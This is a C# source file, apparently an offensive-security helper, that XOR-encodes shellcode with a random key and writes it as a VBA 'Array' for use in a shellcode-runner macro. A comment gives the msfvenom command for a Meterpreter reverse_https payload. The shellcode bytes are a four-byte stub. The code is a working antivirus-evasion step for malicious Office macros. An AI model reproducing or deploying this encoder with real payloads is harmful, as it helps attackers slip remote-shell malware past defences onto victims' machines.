using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace XOR_ShellCode_Encrypter_Helper_VBA
{
    class Program
    {
        static void Main(string[] args)
        {

            int NextInt(int min, int max)
            {
                RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider();
                byte[] buffer = new byte[4];

                rng.GetBytes(buffer);
                int result = BitConverter.ToInt32(buffer, 0);

                return new Random(result).Next(min, max);
            }
          
            // msfvenom.bat -p windows/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=7710 -f csharp
            // Output to be used in XOR_Shellcode_Runner.vb
            byte[] buf = new byte[4] {0xfc,0xe8,0x8f,0x00};

            byte[] encoded = new byte[buf.Length];
            byte xorKey = ((byte)NextInt(1000, 1000000));

            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(buf[i] ^ xorKey);
            }

            uint counter = 0;
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                hex.AppendFormat("{0:D}, ", b);
                counter++;
                if (counter % 35 == 0)
                {
                    hex.AppendFormat("_{0}", Environment.NewLine);
                }
            }

            if (hex.Length > 0)
            {
                hex.Length -= 2;
            }

            Console.WriteLine();

            string fileContent = $"buf = Array(" + hex.ToString() + ")";
            string path = "xor_out.txt";
            File.WriteAllText(path, fileContent);

            Console.WriteLine($"[+] XOR Key         : {xorKey.ToString()}\r");
            Console.WriteLine("[+] Output File     : xor_out.txt");
            Console.WriteLine("[+] Encrypted Bytes :");
            Console.WriteLine();
            Console.WriteLine($"buf = Array(" + hex.ToString() + ")");

        }

    }

}
